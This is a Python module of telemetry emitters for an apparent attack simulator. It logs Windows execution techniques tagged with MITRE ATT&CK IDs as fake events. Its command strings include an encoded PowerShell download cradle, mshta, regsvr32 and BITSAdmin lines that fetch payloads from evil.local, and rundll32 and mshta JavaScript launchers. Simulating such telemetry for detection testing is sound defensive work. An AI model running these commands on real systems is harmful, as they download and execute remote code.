"""Execution primitives for simulator realism (Phase 12).

Provides reusable telemetry emitters for LOLBin / scripting execution
techniques used to deploy payloads and execute code:

  - PowerShell execution (T1059.001)
  - WMI process creation (T1047)
  - Rundll32 execution (T1218.011)
  - Mshta execution (T1218.005)
  - Regsvr32 execution (T1218.010)
  - VBScript execution via cscript (T1059.005)
  - BITSAdmin job creation (T1197)
  - CMSTP execution (T1218.003)
  - User execution — malicious file lure (T1204.002)

MITRE ATT&CK: T1059.001, T1047, T1218.011, T1218.005, T1218.010, T1059.005, T1197, T1218.003, T1204.002
"""

from __future__ import annotations

from telemetry_helper import emit, set_phase


def emit_powershell_execution(process_name: str, script_name: str = "load.ps1") -> None:
    """Execute code via PowerShell (T1059.001)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "powershell.exe", "CRITICAL",
         source_process=process_name,
         command=f"powershell -ExecutionPolicy Bypass -File {script_name}",
         detail=f"Executing PowerShell script: {script_name}",
         technique_id="T1059.001")
    emit("PROCESS", "CREATE_PROCESS", "powershell.exe", "CRITICAL",
         source_process=process_name,
         command="powershell -EncodedCommand SQBFAFgAKABOAEUAVwAtAE8AQgBKAEUAQwBUACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAcgBpAG0AcwBvAG4ALgBjAG8AbQAvAGEA'",
         detail="Downloading and executing payload via encoded PowerShell command",
         technique_id="T1059.001")


def emit_wmi_execution(process_name: str, target: str = "localhost") -> None:
    """Execute code via WMI (T1047)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "wmic.exe", "CRITICAL",
         source_process=process_name,
         command=f"wmic /node:{target} process call create rundll32.exe",
         detail=f"Remote process creation via WMI on {target}",
         technique_id="T1047")
    emit("PROCESS", "CREATE_PROCESS", "powershell.exe", "CRITICAL",
         source_process=process_name,
         command=f"powershell Invoke-WmiMethod -ComputerName {target} -Path Win32_Process -Name Create -ArgumentList 'malware.exe'",
         detail=f"WMI process creation via PowerShell on {target}",
         technique_id="T1047")


def emit_rundll32_execution(process_name: str, dll_name: str = "payload.dll") -> None:
    """Execute code via rundll32 (T1218.011)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "rundll32.exe", "CRITICAL",
         source_process=process_name,
         command=f"rundll32.exe {dll_name},DllMain",
         detail=f"Executing DLL via rundll32: {dll_name}",
         technique_id="T1218.011")
    emit("PROCESS", "CREATE_PROCESS", "rundll32.exe", "CRITICAL",
         source_process=process_name,
         command="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"malware.exe\")",
         detail="Executing JavaScript via rundll32 for LOLBin code execution",
         technique_id="T1218.011")


def emit_mshta_execution(process_name: str, hta_url: str = "http://evil.local/payload.hta") -> None:
    """Execute code via mshta (T1218.005)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "mshta.exe", "CRITICAL",
         source_process=process_name,
         command=f"mshta.exe {hta_url}",
         detail=f"Executing HTA payload from remote URL: {hta_url}",
         technique_id="T1218.005")
    emit("PROCESS", "CREATE_PROCESS", "mshta.exe", "CRITICAL",
         source_process=process_name,
         command='mshta.exe javascript:"new ActiveXObject(\"WScript.Shell\").Run(\"malware.exe\");window.close()"',
         detail="Executing inline JavaScript via mshta",
         technique_id="T1218.005")


def emit_regsvr32_execution(process_name: str, sct_url: str = "http://evil.local/payload.sct") -> None:
    """Execute code via regsvr32 (T1218.010)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "regsvr32.exe", "CRITICAL",
         source_process=process_name,
         command=f"regsvr32.exe /s /n /u /i:{sct_url} scrobj.dll",
         detail=f"Executing scriptlet via regsvr32 Squiblydoo: {sct_url}",
         technique_id="T1218.010")
    emit("PROCESS", "CREATE_PROCESS", "regsvr32.exe", "WARNING",
         source_process=process_name,
         command="regsvr32.exe payload.dll",
         detail="Registering COM DLL via regsvr32",
         technique_id="T1218.010")


def emit_script_execution(process_name: str, script_type: str = "vbs") -> None:
    """Execute VBScript or JScript via cscript/wscript (T1059.005)."""
    set_phase("execution")
    if script_type == "vbs":
        emit("PROCESS", "CREATE_PROCESS", "cscript.exe", "CRITICAL",
             source_process=process_name,
             command="cscript.exe //nologo payload.vbs",
             detail="Executing VBScript via cscript",
             technique_id="T1059.005")
    else:
        emit("PROCESS", "CREATE_PROCESS", "wscript.exe", "CRITICAL",
             source_process=process_name,
             command="wscript.exe //nologo payload.js",
             detail="Executing JScript via wscript",
             technique_id="T1059.005")
    emit("FILE", "CREATE_FILE", "payload.vbs", "WARNING",
         source_process=process_name,
         detail="Dropping VBScript dropper script",
         technique_id="T1059.005")


def emit_bitsadmin_execution(process_name: str, download_url: str = "http://evil.local/payload.exe") -> None:
    """Execute code via BITSAdmin (T1197)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "bitsadmin.exe", "WARNING",
         source_process=process_name,
         command=f"bitsadmin /transfer job /download /priority high {download_url} C:\\Windows\\Temp\\payload.exe",
         detail=f"Downloading payload via BITSAdmin from {download_url}",
         technique_id="T1197")
    emit("PROCESS", "CREATE_PROCESS", "bitsadmin.exe", "WARNING",
         source_process=process_name,
         command="bitsadmin /create EvilJob && bitsadmin /addfile EvilJob http://evil.local/payload.exe C:\\Windows\\Temp\\payload.exe && bitsadmin /RESUME EvilJob",
         detail="Creating and resuming BITS job for payload download",
         technique_id="T1197")


def emit_cmstp_execution(process_name: str) -> None:
    """Execute code via CMSTP (T1218.003)."""
    set_phase("execution")
    emit("PROCESS", "CREATE_PROCESS", "cmstp.exe", "CRITICAL",
         source_process=process_name,
         command="cmstp.exe /s /ns C:\\Windows\\Temp\\evil.inf",
         detail="Executing code via CMSTP connection profile",
         technique_id="T1218.003")
    emit("FILE", "CREATE_FILE", "C:\\Windows\\Temp\\evil.inf", "WARNING",
         source_process=process_name,
         detail="Writing CMSTP profile INF file with embedded script",
         technique_id="T1218.003")


def emit_user_execution(process_name: str, lure_file: str = "invoice.pdf") -> None:
    """Masquerade as a user-opened file to trigger execution (T1204.002)."""
    set_phase("execution")
    emit("FILE", "CREATE_FILE", lure_file, "WARNING",
         source_process=process_name,
         detail=f"Dropping malicious lure file: {lure_file}",
         technique_id="T1204.002")
    emit("PROCESS", "CREATE_PROCESS", lure_file.split(".")[-1] + ".exe" if "." in lure_file else lure_file,
         "CRITICAL",
         source_process=process_name,
         command=lure_file,
         detail=f"User opened malicious file: {lure_file}",
         technique_id="T1204.002")
